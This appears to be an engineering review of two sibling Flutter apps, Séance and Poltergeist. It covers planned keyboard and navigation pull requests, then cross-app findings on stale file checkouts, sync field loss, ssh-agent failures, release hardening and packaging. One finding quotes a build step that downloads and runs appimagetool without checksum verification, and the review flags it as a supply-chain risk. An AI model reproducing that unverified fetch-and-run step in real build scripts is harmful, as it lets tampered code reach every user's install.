  - `edit.paste` into the active pane's location enqueues through the
    existing `PaneDropDelegate` verb path, the same code a drag uses, so
    conflict and safety rules are free.
  - Add Edit-menu rows and context-menu entries.
  - OS clipboard interop comes later.
- **Effort:** M.

---

### 3. Best PR candidates

1. **P4-01: keyboard return from the header filter.**
   - **Test first:** in `header_filter_test.dart`, after Esc, after Enter and
     after ↓, assert `primaryFocus.debugLabel == 'pane.left.listing'` and that
     ArrowDown then sets `cursorIndex`. All fail today.
   - **Implementation:** add an `onReturnToListing` callback to
     `_HeaderFilterField` (wired to `_focusPane(workspace.activePane)`).
     Replace `unfocus()` on Esc. Add `onSubmitted` and an arrowDown binding
     that return focus and put the cursor on row 0 when none exists.
   - **Size:** ~60 lines plus tests.

2. **P4-02: going up or back keeps your place.**
   - **Tests first:** a controller test (goUp from `/home/tester` selects
     `tester`), a widget test (with 80 siblings the row is revealed on
     screen), and goBack restores the previous cursor.
   - **Implementation:** `_revealAfterListing` in `PaneController`, set by
     `goUp`. Per-history-entry cursor path and scroll offset, captured in
     `_issueNavigation`. `PaneView._syncReveal` reveals the cursor (centred)
     or restores the offset instead of `jumpTo(0)`. Make sure a re-list or
     watch refresh does not consume the reveal.
   - **Size:** ~150–250 lines.

3. **Listing keyboard pack: P4-03 + P4-10 + P4-11 + P4-16.**
   - **Tests first,** one per key, in the existing pane keyboard test file:
     - PageDown moves by a viewport minus one row, and Shift extends.
     - Backspace with a live buffer edits the buffer and does not navigate.
     - numpadEnter opens on Linux.
     - Esc after ⌘A deselects.
   - **Implementation:** four small cases in `_PaneViewState._handleKey`, a
     `typeAheadBackspace()` in the controller, a numpadEnter activator on
     `go.open`, and an optional `edit.deselectAll` command.
   - **Size:** ~200 lines with tests.

4. **P4-04: tail-preserving names.**
   - **Test first:** at 260 px, a long `…_41.jpeg` name renders its tail. The
     current single `Text` fails a `find.textContaining('41.jpeg')` on the
     visible run.
   - **Implementation:** a `_TailKeepingName` widget
     (`Row(Flexible(head…), Text(tail))`), used in `_PaneRow`, `_CompactRow`
     and the tab chips. No binary search, so no perf regression.
   - **Size:** ~120 lines.

5. **P4-06 + P4-09: back navigation on every input.**
   - **Tests first:** Android at 1200x900, `handlePopRoute()` goes back one
     folder. A synthetic `kBackMouseButton` press goes back.
   - **Implementation:** a `PopScope` over the non-compact touch layout using
     an extracted pure `nextTouchBackStep`. Two early returns in `PaneView`'s
     pointer listener.
   - **Size:** ~120 lines.

6. **P4-07 (+ part of P4-15): region-correct, cached date formatting.**
   - **Tests first:** `pane_format` unit tests for `de_CH`/24 h and `en_GB`,
     and a widget test with `localesTestValue`.
   - **Implementation:** `formattingLocale(context)` plus
     `alwaysUse24HourFormatOf`, and a static formatter cache in
     `pane_format.dart` reused by `history_view`/`conflict_widgets`/Info.
   - **Size:** ~150 lines.

P4-05 (overlay default) and P4-08 (focus ring) are also good, self-contained
PRs. P4-05 is a small product decision (whether the overlay stage starts
hidden), so it is worth one line from the owner first.

### 4. Ideas

- **"Where was I" folder memory.** Extends P4-02. Remember each folder's last
  cursor and scroll in a small per-location LRU (not synced), so reopening
  `/var/www/site` from the sidebar lands where you left it, with a subtle row
  flash. First slice: in-memory LRU of 200 locations in `WorkspaceController`.
- **Ghost rows for incoming files.** Show files being uploaded into the
  visible folder as dimmed rows with a thin progress bar, as Transmit does.
  The listing then tells the truth before the post-transfer refresh. First
  slice: read-only overlay rows from `ActivityPanelController` tasks whose
  destination dir equals the pane location.
- **Compare panes at a glance.** A toggle that tints rows in each pane as
  only-here, newer-here or same, using a shallow name+size+mtime compare of
  the two visible listings (no recursion). It is a two-second preview of
  what Sync would do. First slice: a pure function
  `comparePaneListings(a, b)` plus a 3 px leading color bar in `_PaneRow`.
- **Type-ahead fallback.** When no prefix matches, fall back to the first
  substring match and draw the badge in a different tone ("contains"), so
  the jump never silently fails. First slice: second pass in
  `PaneController.typeAhead` plus a badge variant.
- **Recently haunted.** In keeping with the app's name, a tiny ghost dot on
  rows modified in the last 5 minutes (local or remote mtime vs the listing
  time). It helps spot the file you just saved or uploaded. First slice: a
  `modifiedAt` threshold check in `_PaneRow` with the D34 "attention" hue.
- **Hold-⌘ shortcut hints.** Holding ⌘ (or Ctrl) for 700 ms overlays each
  header button and pane affordance with its chord, iPadOS-style, drawn from
  the registry's activators so it cannot drift. First slice: a
  `HardwareKeyboard` listener in the shell toggling a `ValueNotifier` the
  toolbar reads.
- **Path field completion.** In ⇧⌘G / ⌘L, Tab completes the next segment
  from the cached listing of the current or typed parent (remote-safe: no new
  round trip unless the parent is uncached). First slice: local-only
  completion from `controller.entries` when the typed prefix has no
  separator.

---

## Slice X: cross-cutting review of Séance + Poltergeist

Reviewed at Séance `dd7e105` (main, 2026-09-26, pubspecs 0.9.2) and Poltergeist `913ca3d` (main, pubspecs 1.0.1). Both checkouts were treated as read-only. I did not run either test suite. Line references are to those revisions. Confidence labels:

- VERIFIED: read in the code, or confirmed from tool source.
- LIKELY: code verified, runtime consequence inferred.
- SPECULATIVE: plausible but not checked.

### 1. Summary

- **Shared UI stays in step where the docs say it must.** These files match as documented: `family_hues.dart` (byte-identical), `sidebar_kit.dart` and `selected_tab_view.dart` (identical except imports), the settings-window runners on all three desktops, and the theme presets and palette.
  - Drift sits in the ported feature code: the checkout pipeline, the server editor, `editor_syntax.dart`, `atomic_file.dart` and `badge_image.dart`.
- **Most important port gap (Séance to Poltergeist): stale checkouts.** Séance #105 (2026-09-14) made a reopened managed checkout re-stat the server and refresh. Poltergeist's `CheckoutManager.checkout()` still returns the existing record without checking the server.
  - A reopened file can show stale content.
  - The save-conflict dialog then offers "Overwrite Remote Version" over the newer server copy.
  - The PORTS M10 sweep called #105 "complementary; no port edit". The code says otherwise.
- **The shared server catalog is now two-way, but Poltergeist lags behind Séance.** Since 2026-09-24 Poltergeist edits and pushes Séance `serverConfig` and `secret:` records.
  - Its ported editor drops `jumpHostId` on save. Séance fixed this in #131.
  - `ServerConfig` discards JSON keys it does not know. Any client on an older pin therefore strips newer fields fleet-wide when it edits a server.
  - Séance `docs/POLTERGEIST.md` still says Poltergeist treats `serverConfig` as read-only.
- **Pin status.** Poltergeist pins Séance `v0.9.1` (`035b0d8`, 119 commits behind main).
  - The wire is unchanged: `seance_protocol/lib` has no diff since the pin.
  - Séance main (#131, not in any tag yet) makes ssh-agent the default for new and keyless-imported servers.
  - Poltergeist's pinned opener throws `AgentAuthUnsupportedError` for agent auth. Once Séance tags #131, every new Séance server fails in Poltergeist until Poltergeist re-pins.
  - The re-pin itself is a breaking API bump (see X-25).
- **Séance agent auth on macOS.** Séance's macOS build is App-Sandboxed. The sandbox very likely blocks the `$SSH_AUTH_SOCK` Unix socket, so the new agent default would fail on Séance's main platform. LIKELY; needs a check on a Mac.
- **CI and release: Poltergeist is ahead.** Its release workflow is hardened: SHA-pinned actions, tag and version checks, refuse-overwrite, draft then publish, SHA256SUMS, a lockfile drift check, and Flutter pinned to 3.47.2.
  - Séance has none of this (known as ANALYSIS SOL-040/056), and Poltergeist's workflow is a ready template.
  - Both download and run `appimagetool` without a checksum. appimagetool likely also downloads the AppImage runtime from a mutable "continuous" release.
- **Platform folders.**
  - Neither app sets Android backup rules. Séance has this logged; for Poltergeist it is new, and Android became supported under D35.
  - Neither app has a single-instance guard on Linux (`G_APPLICATION_NON_UNIQUE`) or Windows, although Poltergeist's store design assumes one process.
  - Séance's iOS display name is still "Seance App".
  - Séance's `.deb` libstdc++ version floor never rejects anything.
- **Docs drift.**
  - Séance: test counts are two weeks stale, POLTERGEIST.md's "read-only" claim is wrong, and the CHANGELOG has no 0.9.2 section.
  - Poltergeist: AGENTS.md still says core is a "scaffold today", PORTS says `badge_image` is verbatim when it is not, and a `file_stores.dart` comment describes a write queue that does not exist.

### 2. Findings

| ID | Title | Sev | Category | Status | Conf |
|---|---|---|---|---|---|
| X-01 | Poltergeist reopens a stale managed checkout; "Overwrite" can clobber newer server content | P2 | stability/data-safety | KNOWN (PORTS M10 sweep; declined as "complementary", wrongly) | VERIFIED |
| X-02 | Poltergeist's server editor drops `jumpHostId` on save and pushes the loss to Séance | P2 | bug / cross-app compat | NEW | VERIFIED |
| X-03 | `ServerConfig` discards unknown JSON keys, so a lagging client's edit strips newer fields fleet-wide | P2 | stability/data-safety (protocol) | NEW | VERIFIED |
| X-04 | Séance's agent-by-default (#131) makes new Séance servers unusable in Poltergeist on the v0.9.1 pin | P1 (once Séance tags #131) | cross-app compat | NEW | VERIFIED |
| X-05 | Poltergeist on v0.9.1 silently dials the destination directly when `jumpHostId` is set | P3 now; P1 once ProxyJump is editable | security | NEW (import path KNOWN as D22 badge) | LIKELY |
| X-06 | Séance macOS App Sandbox likely blocks the ssh-agent socket; agent is now the default | P1 (macOS) | cross-platform | NEW | LIKELY |
| X-07 | Séance release workflow lacks Poltergeist's hardening | P2 | build/release / security | KNOWN (ANALYSIS SOL-040/056) | VERIFIED |
| X-08 | `appimagetool` (and likely the AppImage runtime) downloaded and executed without verification | P2 | security (supply chain) | NEW | VERIFIED (no checksum) / LIKELY (runtime fetch) |
| X-09 | No single-instance guard on Linux/Windows; Poltergeist's "one app process" assumption is unenforced | P2 | stability/data-safety | KNOWN for Séance (SOL-034); NEW for Poltergeist | LIKELY |
| X-10 | Android auto-backup left on in both apps (vault ciphertext, `deviceId`, stores; Keystore key not restorable) | P2 | security / data-safety | KNOWN for Séance (SOL-040/056); NEW for Poltergeist | VERIFIED (manifest) / LIKELY (restore effects) |
| X-11 | Séance CI and release build on unpinned Flutter/Dart `stable`; Poltergeist pins 3.47.2 | P2 | build/release | partly KNOWN (SOL-040/056 "pin an SDK") | VERIFIED |
| X-12 | Séance `.deb` libstdc++6 floor compares an ABI tag against a package version, so it is always satisfied | P3 | build/release | NEW (fixed in Poltergeist) | VERIFIED |
| X-13 | Séance packaging port-backs: desktop-file id, copyright text, build.sh exit status, black resize flash | P3 | build/release / visual | NEW | VERIFIED |
| X-14 | Dependabot `gradle` entry points at `/` in both repos (no Gradle files there) | P3 | build/release | NEW | VERIFIED (config) / LIKELY (no-op) |
| X-15 | Poltergeist `syntaxLanguageFor` ignores `\` separators (local Windows paths) | P3 | bug / cross-platform | NEW (fixed in Séance) | VERIFIED |
| X-16 | Séance `badge_image` encode phase catches only `Exception`; Poltergeist fixed it, and PORTS still says "verbatim" | P3 | bug | NEW | VERIFIED |
| X-17 | Poltergeist `writeStringAtomically` does not order same-path writes; ported comment claims it does | P3 | stability / docs | NEW | VERIFIED |
| X-18 | Séance APK `versionCode` is always 1 (pubspec has no `+build`) | P3 | build/release | NEW | VERIFIED (Flutter 3.47.2 source) |
| X-19 | Séance iOS home-screen name is "Seance App" | P3 | visual | NEW | VERIFIED |
| X-20 | Séance `docs/POLTERGEIST.md` says Poltergeist writes only `bookmark:`/`hostkey:` records | P2 | docs drift | NEW | VERIFIED |
| X-21 | Other agent-misleading docs drift (test counts, "scaffold today", CI overview, CHANGELOG versions) | P3 | docs drift | NEW | VERIFIED |
| X-22 | No `NSLocalNetworkUsageDescription` (iOS; macOS 15+ local network privacy) | P3 | cross-platform / UX | KNOWN for iOS (SOL-040/056); NEW for macOS | LIKELY |
| X-23 | Séance Dockerfile uses floating `dart:stable` / `debian:stable-slim` | P3 | build/release | KNOWN (SOL-040/056) | VERIFIED |
| X-24 | Smaller CI port-backs to Séance: review retry, secret scan, multi-OS Dart tests, `persist-credentials` | P3 | build/release | NEW | VERIFIED |
| X-25 | Re-pin to a #131-containing tag is a breaking bump (planning note) | info | cross-app compat | NEW | VERIFIED |
| X-26 | Poltergeist ported the macOS accessibility guard without its regression gate, and relies on Séance's gate on a different Flutter line | P3 | cross-platform | KNOWN (PORTS) + NEW angle | VERIFIED |

#### X-01: Poltergeist reopens a stale managed checkout
- **Severity / category:** P2, stability/data-safety.
- **Status:** KNOWN. The PORTS.md "M10 milestone-close sweep" (2026-09-22) called Séance #105's freshness work "Complementary to the ported `CheckoutManager` rails; no port edit." The code shows the refresh is simply missing.
- **Confidence:** VERIFIED.
- **Locations:**
  - Poltergeist `packages/poltergeist_core/lib/src/checkout/checkout_manager.dart:214-226`: if a record exists, `return existing.first` with no remote stat.
  - Caller: `app/poltergeist_app/lib/ui/workspace_shell.dart:2708` and `:2854`.
  - Conflict dialog: `workspace_shell.dart:3130-3165` (`overwriteRemoteChanges: true` behind `editorConflictOverwrite`).
  - Séance fix: `app/seance_app/lib/services/remote_files_controller.dart:688-756`: `checkoutRemoteFile` → `_refreshExistingCheckout`, reconcile then `stat`; a clean copy whose snapshot moved is re-downloaded, a dirty one is kept and the drift recorded in `latestRemoteSnapshots`, with an editor Reload banner.
- **Evidence:**
  - `reconcileOnResume`/`_repairRemote` rehash local files or repair only `needsReconcile` records.
  - Nothing re-stats the server on reopen.
  - The Poltergeist editor has no reload banner or drift signal (grep of `built_in_text_editor.dart` finds none).
- **Failure scenario:**
  1. Open `/etc/app.conf` from server A in Poltergeist and close the editor. The checkout persists.
  2. A colleague or a deploy changes the file on the server.
  3. Reopen it in Poltergeist: the old local copy loads silently.
  4. Edit and save: the CAS upload refuses and shows "Remote file changed … Overwrite the remote version?"
  5. The user assumes it is their own edit and clicks Overwrite, replacing the newer server content with an edit based on stale text.
- **Fix:** in `checkout()`, when a live record exists, port `_refreshExistingCheckout`:
  - `await _store.reconcile(id)`.
  - Lease a transfer channel and `stat` the remote path.
  - On notFound, record it and return the local copy.
  - Clean copy with a different snapshot: re-download through `enqueueManagedCheckout`, which keeps the CAS and journal rails.
  - Dirty copy: return it but set a `remoteChanged` flag so the editor can show "Server copy changed — Reload / Keep mine".
  - Tests: clean copy refreshed, dirty copy kept and flagged, unreachable server returns the local copy.
- **Effort:** M.

#### X-02: Poltergeist's server editor drops `jumpHostId` on save
- **Severity / category:** P2, bug / cross-app compat.
- **Status / confidence:** NEW, VERIFIED.
- **Locations:**
  - Poltergeist `app/poltergeist_app/lib/ui/server_editor.dart:1048-1087`: `_formConfig` builds a fresh `ServerConfig(...)` with no `jumpHostId`.
  - Save path: `lib/services/server_editor_backend.dart:73-76` → `bookmark_backup_service.dart:290` (`_coordinator?.onServerSaved`), which seals a `serverConfig` record to the shared account.
  - Séance fixed the same port source in #131: `app/seance_app/lib/ui/server_editor.dart:919-920` ("ProxyJump editing is not exposed yet; preserve the saved route.").
  - Séance applies pulled configs unconditionally: `packages/seance_core/lib/src/sync/sync_coordinator.dart:609-631` (`configStore.putServer(pulled)`).
- **Failure scenario:**
  1. A server has a jump route: set by a future Séance editor or import, or by a hand-edited record.
  2. The user renames it in Poltergeist.
  3. The new record (newer `updatedAt`, no `jumpHostId`) wins last-write-wins on every Séance device.
  4. The route is gone everywhere, and Séance now connects directly or fails.
  - Latent today, because no Séance UI sets `jumpHostId` yet. Every shipped Poltergeist 1.0.x build carries the bug, so fix it before Séance exposes ProxyJump.
- **Fix:** add `jumpHostId: widget.existing?.jumpHostId,` in `_formConfig`, with a regression test (edit a config that has `jumpHostId`; the saved config keeps it). Also audit `server_duplication.dart`; it already carries the field.
- **Effort:** S.

#### X-03: `ServerConfig` discards unknown JSON keys
- **Severity / category:** P2, stability/data-safety (protocol forward compatibility).
- **Status / confidence:** NEW, VERIFIED.
- **Locations:**
  - Séance `packages/seance_protocol/lib/src/models/server_config.dart:327-360`: `toJson` writes only known fields.
  - `:362-400`: `fromJson` reads only known fields. Unknown `icon` names degrade to null (by design, "older build ignores the keys it does not know").
- **Evidence:**
  - Poltergeist now round-trips Séance's catalog through its own pinned `seance_protocol` (the 04 §4.2 amendment, "a Poltergeist-written record is indistinguishable from a second Séance device's").
  - It is effectively a permanently lagging Séance device: pin at v0.9.1 while Séance moves ahead.
- **Failure scenario:**
  1. Séance 0.10 adds a `ServerConfig` field (say `forwardAgent`, a new `ServerIcon` value, or a keepalive override).
  2. The user edits that server's label in Poltergeist (older pin).
  3. The pushed record lacks the field or icon and wins LWW, so the setting silently disappears from every Séance device.
  - The same class exists among mixed-version Séance devices, but the sibling makes it routine.
- **Fix (in `seance_protocol`, then a Poltergeist re-pin):**
  - Keep a private `Map<String, Object?> _unknown` captured in `fromJson` (keys not in the known set) and merge it back in `toJson`.
  - Have `copyWith` carry it over.
  - For fields known but rejected (unknown enum names), keep the raw value in `_unknown` so it round-trips.
  - Test: decode JSON with extra keys, then `copyWith(label:)`, then `toJson`; the extra keys survive byte-identical.
  - Apply the same pattern to `Bookmark` and `Snippet`.
- **Effort:** M.

#### X-04: Séance's agent default makes new Séance servers unusable in Poltergeist on v0.9.1
- **Severity / category:** P1 once Séance tags #131; cross-app compat.
- **Status / confidence:** NEW, VERIFIED.
- **Locations:**
  - Séance main `app/seance_app/lib/ui/server_editor.dart:287` (`_auth = e?.authMethod ?? AuthMethod.agent`).
  - `packages/seance_core/lib/src/ssh_config/ssh_config_import.dart:35` (keyless hosts become `AuthMethod.agent`).
  - Poltergeist pin `v0.9.1` `ssh_session.dart:542-555` (`throw AgentAuthUnsupportedError('Signing in with the SSH agent is not supported yet…')`).
  - Poltergeist `lib/services/prompt_coordinator.dart:205-221` answers agent prompts without a dialog, so the failure is the opener's error.
- **Failure scenario:** after Séance releases #131, a user adds a server in Séance or imports `~/.ssh/config`. The server syncs into Poltergeist's "Séance servers" section, and every connection fails with "not supported yet".
- **Fix (either):**
  - Coordinate: tag Séance (for example v0.9.3), re-pin Poltergeist in the same window (see X-25), flip Poltergeist's editor default to agent at `server_editor.dart:340-343`, and drop the warning text.
  - Interim Poltergeist fallback: on `AgentAuthUnsupportedError`, open the credential dialog with a note ("This server uses ssh-agent, which this build can't use yet — enter a password or key for this device").
  - Do not tag Séance's agent default until one of these is ready.
- **Effort:** S (fallback) / M (re-pin).

#### X-05: Poltergeist dials the destination directly when `jumpHostId` is set
- **Severity / category:** P3 now, P1 once ProxyJump is editable; security.
- **Status:** NEW for synced configs. The ssh_config import path is KNOWN and deliberately badged as `sshImportLimitProxyJump`.
- **Confidence:** LIKELY.
- **Locations:**
  - Poltergeist resolves `serverConfigId` to the pulled config "for jumpHostId above all" (`workspace_shell.dart:3568-3585`, `pane_controller.dart:1001-1008`).
  - The v0.9.1 opener never reads `jumpHostId`. `PoolKey` only carries it ("carried, compared, never executed in v1", `pool_key.dart:16-40`).
  - Séance main refuses a route with no resolver: `ssh_session.dart:855-861` ("Jump host … cannot be resolved").
- **Failure scenario:**
  1. A bastion-only host `db01` exists.
  2. Poltergeist resolves `db01` via the laptop's DNS search domain to a different machine.
  3. First-use TOFU prompts, the user accepts, and a password goes to the wrong host. The bastion's access control is bypassed without any warning.
- **Fix:** until re-pin, fail synced configs whose `jumpHostId != null` before dialing, with an actionable message ("Uses a jump host; this Poltergeist build can't route through it yet"), or show the D22 badge on catalog rows. After re-pin, pass an `SshJumpHostResolver` built from the catalog.
- **Effort:** S.

#### X-06: Séance macOS App Sandbox likely blocks the ssh-agent socket
- **Severity / category:** P1 for macOS users once released; cross-platform.
- **Status / confidence:** NEW, LIKELY (needs a test on a Mac).
- **Locations:**
  - Séance `app/seance_app/macos/Runner/Release.entitlements`: `app-sandbox` true; the only file exception is read-only `~/.ssh/`.
  - The file is unchanged by #131 (last touched `d18f1ac`, 2026-09-05).
  - `packages/seance_core/lib/src/ssh/ssh_agent.dart:234-258`: `Socket.connect(InternetAddress(SSH_AUTH_SOCK, type: unix))`.
  - Default flip: X-04 locations.
- **Evidence:**
  - launchd's agent socket lives at `/private/tmp/com.apple.launchd.*/Listeners`.
  - 1Password's is in `~/Library/Group Containers/...`; Secretive's is in its own container.
  - App Sandbox denies connecting to Unix-domain sockets outside the container unless an exception covers them. ANALYSIS SOL-028 lists agent, 1Password and Bitwarden without mentioning the sandbox.
- **Failure scenario:** on a Mac, "New server" defaults to ssh-agent, and Connect fails with "Could not use the ssh-agent at SSH_AUTH_SOCK: SocketException … Operation not permitted". This hits imported keyless hosts too.
- **Fix:**
  - Verify on macOS first.
  - Then either drop App Sandbox for the direct-distribution build (Poltergeist ships unsandboxed; Séance is not App Store-distributed, and the sandbox already costs the `~/.ssh` exception, security-scoped bookmarks and the `$HOME` rewrite in STATUS), or add and test the needed temporary exceptions.
  - Map EPERM on macOS to "The macOS sandbox blocks the ssh-agent socket".
  - Keep password as the macOS default until resolved.
- **Effort:** S–M (decision + entitlements + message).

#### X-07: Séance release workflow lacks Poltergeist's hardening
- **Severity / category:** P2, build/release / security.
- **Status:** KNOWN (Séance ANALYSIS "Release/update hardening — SOL-040, SOL-056"). Poltergeist's `release.yml` is a ready template.
- **Confidence:** VERIFIED.
- **Location:** Séance `.github/workflows/release.yml`.
  - `permissions: contents: write, packages: write` at workflow level, inherited by `test`, `native` and `client`.
  - Mutable tags: `softprops/action-gh-release@v2`, `docker/*@v3/v6/v7`, `subosito/flutter-action@v2`, `dart-lang/setup-dart@v1`.
  - Releases are created public immediately, per matrix leg.
  - No tag↔pubspec check on `workflow_dispatch` (the comment at lines 20-24 only asks for it).
  - No refuse-overwrite: action-gh-release updates an existing release and overwrites same-named assets.
  - No SHA256SUMS; Docker `latest` moves on every tag.
- **Compare:** Poltergeist `release.yml`: SHA pins (e.g. `actions/checkout@3d3c42e…`, `softprops/action-gh-release@efb3536…`), "Resolve the checkout ref" dispatch provenance, "Refuse to overwrite an existing release", `release_version check-tag`/`check-order`, `draft: true` with a sums job that verifies a bijection and then publishes, `fail_on_unmatched_files`, and a lockfile drift check.
- **Failure scenarios:**
  - A dispatch of `v0.9.3` from a commit whose pubspecs say 0.9.2 publishes 0.9.2 binaries labeled v0.9.3.
  - A re-run after a partial failure silently replaces assets users may already have downloaded.
  - A retargeted third-party action tag runs with `contents: write` + `packages: write`.
- **Fix:** port the Poltergeist steps, replacing its Dart tool with a 10-line shell check that all four pubspecs equal `${tag#v}`. Add `persist-credentials: false` on checkouts. Scope `test`/`native` to `contents: read`. Add the Docker `latest` rule `type=raw,value=latest,enable=${{ !contains(tag,'-') }}`.
- **Effort:** M (~200 lines YAML).

#### X-08: `appimagetool` downloaded and executed unverified
- **Severity / category:** P2, security (supply chain).
- **Status:** NEW.
- **Confidence:** VERIFIED for the missing checksum; LIKELY for the runtime fetch.
- **Locations:**
  - Séance `scripts/package-linux.sh:380-401`.
  - Poltergeist `scripts/package-linux.sh:455-478` (`curl -fL … appimagetool/releases/download/1.9.1/appimagetool-$arch.AppImage` then `chmod 755` then run; no hash).
  - Invoked without `--runtime-file`: Poltergeist `:519-527`, Séance `:436-445`.
- **Evidence:**
  - Release assets are replaceable by the upstream maintainer or a compromised account.
  - Current appimagetool embeds the runtime downloaded from `type2-runtime` "continuous" unless `--runtime-file` is passed. So the shipped AppImage's first-executed code comes from a mutable URL at build time.
  - The client job holds `contents: write`.
- **Failure scenario:** a tampered tool or runtime runs in the release job (it can alter assets) and ends up inside every user's AppImage.
- **Fix:**
  - Pin `APPIMAGETOOL_SHA256_x86_64` and `_aarch64` and verify with `sha256sum -c` before `chmod`.
  - Pin a specific `type2-runtime` release asset with its SHA-256 and pass `--runtime-file`.
  - Do this in both repos; the scripts are near-identical.
- **Effort:** S.

#### X-09: No single-instance guard on Linux/Windows
- **Severity / category:** P2, stability/data-safety.
- **Status:** KNOWN for Séance (ANALYSIS SOL-034: "Multiple Linux processes can write the same stores"). NEW for Poltergeist, whose STATUS relies on "one app process (D13), one store instance built at startup".
- **Confidence:** LIKELY.
- **Locations:**
  - `linux/runner/my_application.cc:131` in both apps (`G_APPLICATION_NON_UNIQUE`).
  - `windows/runner/main.cpp` in both: no mutex and no find-window.
  - Poltergeist `docs/STATUS.md:1537-1548`.
  - Whole-map flush from an in-memory cache: Poltergeist `lib/services/file_stores.dart:175-215`.
- **Failure scenario:**
  1. On Linux, clicking the dock icon again spawns a second process.
  2. Each process caches `servers.json`, `vault.json` and settings, so whichever writes last drops the other's changes.
  3. Worst case: process A re-keys the vault while B still holds the old key and cache. B's next secret save rewrites `vault.json` sealed under the old key, and the next launch cannot open the vault.
  - Poltergeist's checkout store does refuse a second instance, but the other stores do not.
- **Fix:**
  - Linux: use `G_APPLICATION_DEFAULT_FLAGS` so a second launch activates the first. Poltergeist can route that `activate` to "new workspace window" (D39).
  - Windows: a named mutex, with `FindWindow`/`SetForegroundWindow` on the existing instance.
  - As a backstop, take an exclusive lock on an `instance.lock` file in app-support at startup and show "already running" if it is held.
- **Effort:** S–M per app.

#### X-10: Android auto-backup left on
- **Severity / category:** P2, security / data-safety.
- **Status:** KNOWN for Séance (SOL-040/056: "Exclude keystore-dependent data from incompatible backup restore"). NEW for Poltergeist, which is supported on Android since D35 (2026-09-25).
- **Confidence:** VERIFIED for the manifest; LIKELY for restore effects.
- **Locations:**
  - `android/app/src/main/AndroidManifest.xml` in both: no `allowBackup`, `fullBackupContent` or `dataExtractionRules`; no `res/xml/`.
  - Séance stores in the files dir: `lib/services/app_services.dart:157-177` (`servers.json`, `vault.json`, `known_hosts.json`, `settings.json` with `deviceId`, `sftp-checkouts/`).
- **Evidence:**
  - Auto Backup and device-to-device transfer copy the files dir and shared prefs.
  - The Android Keystore key that wraps flutter_secure_storage is never restored.
  - flutter_secure_storage's own README tells apps to disable backup or exclude its prefs.
- **Failure scenario:**
  - A restore to a new phone brings back `vault.json` and flutter_secure_storage prefs without the key. The keystore read fails, the vault starts locked with the Linux-keyring message, or a fresh key orphans the vault.
  - Or a cloned `settings.json` gives two devices the same `deviceId`. `sync_coordinator.dart:564,585` treats "own" retractions specially, so one device misreads the other's.
- **Fix:**
  - Add `android:allowBackup="false"`, `android:fullBackupContent="false"` and `android:dataExtractionRules="@xml/data_extraction_rules"`.
  - The rules file excludes all `cloud-backup` and `device-transfer` domains, or allows only non-secret files.
  - Test by asserting the manifest attributes.
- **Effort:** S (both apps).

#### X-11: Séance builds on unpinned Flutter and Dart
- **Severity / category:** P2, build/release.
- **Status:** partly KNOWN ("Pin an SDK/golden-update policy", SOL-040/056).
- **Confidence:** VERIFIED.
- **Locations:**
  - Séance `ci.yml` and `release.yml`: `subosito/flutter-action@v2` with `channel: stable`, `setup-dart sdk: stable`.
  - `app/seance_app/pubspec.yaml:8`: `flutter: ">=3.24.0"`, inconsistent with `sdk: ^3.12.0`.
  - Séance AGENTS.md §1 clones `-b stable`.
  - Poltergeist pins `FLUTTER_VERSION: '3.47.2'` (CI, release, AGENTS §1, app pubspec `>=3.47.2`).
  - Poltergeist PORTS (view-controller entry) says its accessibility workaround is "verified only by Séance's gate against the same Flutter line". That holds only while Séance's floating stable happens to be 3.47.x.
- **Failure scenario:** a Flutter stable release lands between CI and the tag. The release is built on an untested toolchain, and the macOS accessibility workaround (which is engine-version specific) is exercised on the wrong engine for Poltergeist.
- **Fix:** add `env: FLUTTER_VERSION: '3.47.2'` to both Séance workflows, set the app pubspec floor to `>=3.47.2`, pin AGENTS §1, and bump both siblings together.
- **Effort:** S.

#### X-12: Séance `.deb` libstdc++6 floor is always satisfied
- **Severity / category:** P3, build/release.
- **Status:** NEW. Fixed in Poltergeist `scripts/package-linux.sh:226-278` (GLIBCXX_x → GCC-release mapping per GCC's ABI table).
- **Confidence:** VERIFIED.
- **Location:** Séance `scripts/package-linux.sh:204-219`. `floor_of GLIBCXX_` strips the prefix and emits `libstdc++6 (>= 3.4.30)`.
- **Evidence:** dpkg compares that against package versions such as `12.2.0-14` or `10.2.1-6`. 12 > 3 and 10 > 3, so the floor never rejects.
- **Failure scenario:** a bundle that references `GLIBCXX_3.4.32` installs on a distro whose glibc passes the floor but whose libstdc++ lacks the tag. Launch then fails with "version `GLIBCXX_3.4.32' not found". Low practical impact today, because the glibc floor excludes most such systems.
- **Fix:** copy Poltergeist's `glibcxx_gcc`/`gcc_gcc` mapping block and its tests.
- **Effort:** S.

#### X-13: Séance packaging port-backs
- **Severity / category:** P3, build/release / visual.
- **Status / confidence:** NEW, VERIFIED.
- **Desktop-file name:**
  - Séance writes `seance.desktop` (`package-linux.sh:324`), while the GApplication id is `com.lkm.seance_app` (`linux/CMakeLists.txt:10`).
  - Wayland shells (KDE in particular) match the window's `app_id` to the desktop-file name, so the dock can show a generic icon or a second entry.
  - Poltergeist names the file `$LINUX_APPLICATION_ID.desktop`.
- **Copyright file:** Séance's `copyright` says "License: as published in the source repository" (`:330`). Poltergeist embeds the Unlicense text (`write_copyright`).
- **build.sh exit status:** Séance ignores `package_linux`'s failure (`scripts/build.sh:264`), so the run exits 0 after "packages: FAILED". Poltergeist uses `package_linux || FAILED=1` (`build.sh:221`, with a comment naming Séance).
- **Resize flash:** Séance's GTK view background is `#000000` (`linux/runner/my_application.cc:48`), which flashes black on resize under light themes. Poltergeist uses a transparent background, in the main and settings views.
- **Fix:** port all four.
- **Effort:** S.

#### X-14: Dependabot `gradle` entry points at `/`
- **Severity / category:** P3, build/release.
- **Status:** NEW.
- **Confidence:** VERIFIED for the config; LIKELY that it is a no-op.
- **Location:** `.github/dependabot.yml` in both (`package-ecosystem: gradle`, `directory: /`).
- **Evidence:**
  - Gradle files exist only under `app/*/android/`.
  - The history shows Dependabot PRs only for github-actions in both repos.
- **Failure scenario:** AGP, Kotlin and Gradle wrapper updates never arrive. The file_picker/AGP-9 workaround stays unnoticed.
- **Fix:** `directory: /app/seance_app/android` (resp. `/app/poltergeist_app/android`).
- **Effort:** S.

#### X-15: Poltergeist `syntaxLanguageFor` ignores `\` separators
- **Severity / category:** P3, bug / cross-platform.
- **Status / confidence:** NEW, VERIFIED.
- **Locations:**
  - Poltergeist `app/poltergeist_app/lib/ui/editor_syntax.dart:890-893` splits on `/` only.
  - Séance `app/seance_app/lib/ui/editor_syntax.dart:433-438` uses `lastIndexOf(RegExp(r'[/\\]'))`, from `76d2d9b`.
